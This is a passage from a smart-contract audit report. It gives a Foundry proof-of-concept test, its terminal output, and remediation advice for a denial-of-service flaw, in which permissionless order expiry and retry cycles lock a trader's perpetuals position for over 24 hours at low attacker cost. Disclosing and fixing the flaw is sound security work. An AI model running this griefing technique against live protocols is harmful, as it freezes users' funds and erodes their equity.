        AccountLensViewTypes.AccountLedgerSnapshot memory snapAfter24h =
            engineAccountLens.getAccountLedgerSnapshot(ALICE);
        uint256 carryAfter24h = _totalCarryDue(ALICE);
        uint256 frozenNetEquityCents = uint256(snapAfter24h.netEquityAssets) / 1e4;
        uint256 freezeToCostRatioScaled = (frozenNetEquityCents * 10) / projected24hUsdCents; // e.g. 2858 -> 285.8
        uint256 ratioWhole = freezeToCostRatioScaled / 10;
        uint256 ratioFrac = freezeToCostRatioScaled % 10;
        string memory ratioStr = string.concat("1 to ", vm.toString(ratioWhole), ".", vm.toString(ratioFrac));

        console2.log("24h freeze (1440 cycles) duration (s):", frozenDuration);
        console2.log("maxExecutionWindowSeconds:", router.maxExecutionWindowSeconds());
        console2.log("Cycle 1 expireAndRetry call gas:", firstCycleGas);
        console2.log("Cycle 65 expireAndRetry call gas:", lastMeteredCycleGas);
        console2.log("Average L2 tx gas (incl. 21k base + 68B calldata):", avgTxL2Gas);
        console2.log("Projected 24h L2 tx gas (1440 cycles):", projected24hL2Gas);
        console2.log("Cycle 1 L2 exec cost @ 0.02 gwei, ETH=$2100 (excl. L1 blob fee):", _formatUsdScaled(cycle1UsdThousandths, 3));
        console2.log("Cycle 65 L2 exec cost @ 0.02 gwei, ETH=$2100 (excl. L1 blob fee):", _formatUsdScaled(cycle65UsdThousandths, 3));
        console2.log("Projected 24h L2 exec cost (attacker):", _formatUsdScaled(projected24hUsdCents, 2));
        console2.log("Locked user funds (net equity after 24h freeze):", _formatUsdScaled(frozenNetEquityCents, 2));
        console2.log("Freeze-to-cost ratio:", string.concat(ratioStr, " ($1 cost locks $", vm.toString(ratioWhole), ".", vm.toString(ratioFrac), " user equity)"));
        console2.log("Accrued carry during freeze (unavoidable leakage):", _formatUsdScaled((carryAfter24h - carryAtTrigger) / 1e4, 2));

        assertGt(frozenDuration, 24 hours, "position frozen for more than 24 hours");
        assertGt(carryAfter24h, carryAtFirstAttempt, "carry grew monotonically over 24h");
        assertLt(snapAfter24h.netEquityAssets, snapAtTrigger.netEquityAssets, "net equity eroded during 24h freeze");
        assertFalse(snapAfter24h.liquidatable, "position stays open and frozen, not liquidated");
        _assertAliceLockedOut(protectionId);

        // 7. Even if an honest keeper executes the latest retry attempt after 24h, it still fails with ConstraintViolation.
        bytes[] memory lateExecutionData = _mockPythUpdateData(SL_TRIGGER_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory lateResult = router.executeOrder(linkedOrderId, lateExecutionData);
        assertEq(uint8(lateResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(lateResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "position remains trapped open after 24h");
    }

    function test_Control_AtTrigger_SameLimitsExecuteWithoutAmend() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _realisticProtectionParams();
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        vm.warp(vm.getBlockTimestamp() + PRE_TRIGGER_WARP_SECONDS);
        uint64 linkedOrderId = _triggerAt(protectionId, SL_TRIGGER_PRICE);

        // At trigger time, the exact same closeLimits are passable and execute cleanly without any amendment.
        bytes[] memory executionData = _mockPythUpdateData(SL_TRIGGER_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(linkedOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "same closeLimits succeed when executed at trigger");
    }

    function test_Control_WithoutAttacker_OwnerCanAmendAndClose() public {
        _startRecordingLogs();
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _realisticProtectionParams();
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        vm.warp(vm.getBlockTimestamp() + PRE_TRIGGER_WARP_SECONDS);
        uint64 linkedOrderId = _triggerAt(protectionId, SL_TRIGGER_PRICE);
        vm.warp(vm.getBlockTimestamp() + 50);

        bytes[] memory executionData = _mockPythUpdateData(SL_TRIGGER_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory firstResult = router.executeOrder(linkedOrderId, executionData);
        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));

        // Without attacker interference, Alice widens closeLimits while Latched and closes cleanly.
        PositionProtectionTypes.CloseFinancialLimits memory widerLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 500_000e6,
            maxGrossAccountDebitAssets: 500_000e6,
            maxActionChargeAssets: 500_000e6,
            maxExplicitFeesAssets: 500_000e6
        });
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, widerLimits);

        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory retryExecutionData = _mockPythUpdateData(SL_TRIGGER_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory retryResult = router.executeOrder(retryOrderId, retryExecutionData);
        assertEq(uint8(retryResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "control flow closes position after amendment");
    }

    function _assertAliceLockedOut(
        uint64 protectionId
    ) internal {
        PositionProtectionTypes.CloseFinancialLimits memory widerLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 500_000e6,
            maxGrossAccountDebitAssets: 500_000e6,
            maxActionChargeAssets: 500_000e6,
            maxExplicitFeesAssets: 500_000e6
        });

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, widerLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory closeReq = _closeRequest(bytes32(uint256(999_001)));
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, closeReq);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(closeReq);
    }

    function _realisticProtectionParams()
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = LONG_TAKE_PROFIT;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 500_000e6,
            maxGrossAccountDebitAssets: 500_000e6,
            maxActionChargeAssets: ACTION_CHARGE_LIMIT_ASSETS,
            maxExplicitFeesAssets: 500_000e6
        });
    }

    function _totalCarryDue(
        address account
    ) internal view returns (uint256) {
        return engine.unsettledCarryAssets(account) + _expectedIndexedCarryAssets(account);
    }

    function _triggerAt(
        uint64 protectionId,
        uint256 price
    ) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        uint256 ts = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, ts, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _closeRequest(
        bytes32 clientOrderId
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _formatUsdScaled(
        uint256 scaledAmount,
        uint256 decimals
    ) internal pure returns (string memory) {
        uint256 scale = 10 ** decimals;
        uint256 whole = scaledAmount / scale;
        uint256 frac = scaledAmount % scale;
        string memory fracStr = vm.toString(frac);
        while (bytes(fracStr).length < decimals) {
            fracStr = string.concat("0", fracStr);
        }
        return string.concat("$", vm.toString(whole), ".", fracStr);
    }

}
EOF
```

#### 4.2.3. Run the Test

```bash
cd packages/perps
forge test --match-contract PositionProtectionRetryFreezePoCTest -vv
```

### 4.3. Terminal Output of PoC Execution

```text
Ran 3 tests for test/perps/spec/trader/PositionProtectionRetryFreezePoC.t.sol:PositionProtectionRetryFreezePoCTest
[PASS] test_Control_AtTrigger_SameLimitsExecuteWithoutAmend() (gas: 4464796)
[PASS] test_Control_WithoutAttacker_OwnerCanAmendAndClose() (gas: 6286685)
[PASS] test_PoC_PermissionlessRetry_BlocksAmendAndFreezesPositionOver24Hours() (gas: 77816449)
Logs:
  24h freeze (1440 cycles) duration (s): 87840
  maxExecutionWindowSeconds: 60
  Cycle 1 expireAndRetry call gas: 1117751
  Cycle 65 expireAndRetry call gas: 1117766
  Average L2 tx gas (incl. 21k base + 68B calldata): 1139848
  Projected 24h L2 tx gas (1440 cycles): 1641381120
  Cycle 1 L2 exec cost @ 0.02 gwei, ETH=$2100 (excl. L1 blob fee): $0.047
  Cycle 65 L2 exec cost @ 0.02 gwei, ETH=$2100 (excl. L1 blob fee): $0.047
  Projected 24h L2 exec cost (attacker): $68.93
  Locked user funds (net equity after 24h freeze): $19706.86
  Freeze-to-cost ratio: 1 to 285.8 ($1 cost locks $285.8 user equity)
  Accrued carry during freeze (unavoidable leakage): $3.13

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 4.41s (4.41s CPU time)

Ran 1 test suite in 4.41s (4.41s CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

All three test cases confirm the vulnerability: the identical `closeLimits` were fully passable at trigger time, and in the absence of an attacker, the owner cleanly widens them during `Latched` to close the position. Conversely, permissionless `expireOrder + retryPositionProtectionClose` cycles completely block the trader's exit for over 24 hours while monotonic `carry` steadily accumulates and `netEquity` degrades.

---

## 5. Remediation

### 5.1. Restrict Permissionless Retry After Failures Until Owner Amends `closeLimits`

Introduce a state flag `retryRequiresAmendment` (or an incremental `limitsVersion` counter) in `PositionProtectionBook.sol`. This flag should be set inside `handleFailedProtectionAttempt` (`PositionProtectionBook.sol:637-675`) whenever execution terminates with `ConstraintViolation`, `ExecutionModeDisallowed`, `PlannerRejected`, or on a repeated `Expired` result. Crucially, the flag **must not be cleared** by subsequent `TerminalReason.Expired` transitions (otherwise an attacker can bypass the restriction simply by awaiting the timeout of a zero-bounty order or overwriting the failure reason). While this flag remains active, calling `retryPositionProtectionClose` must be restricted strictly to `protection.account`; clearing the flag should occur solely inside `amendLatchedPositionProtectionCloseLimits`.

### 5.2. Introduce an Atomic `amendAndRetryPositionProtectionClose` Function for the Owner

Provide a dedicated router function allowing the position owner to atomically update `closeLimits` and enqueue a new close order in a single transaction. This should also support the case where protection is currently in `Triggered` but the existing child order is already expired (`block.timestamp > executionDeadline` — executing `OrderRouter.expireOrder` first, then applying new limits, and immediately triggering retry).

### 5.3. Provide an Exit Mechanism from `Latched` for Position Owners

Permit `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` during the `Latched` status when `pendingOrderCounts(msg.sender) == 0` (the trigger bounty has already been settled by this stage). This enables the trader to exit manually without having to participate in an asymmetric timing race against automated keeper bots.


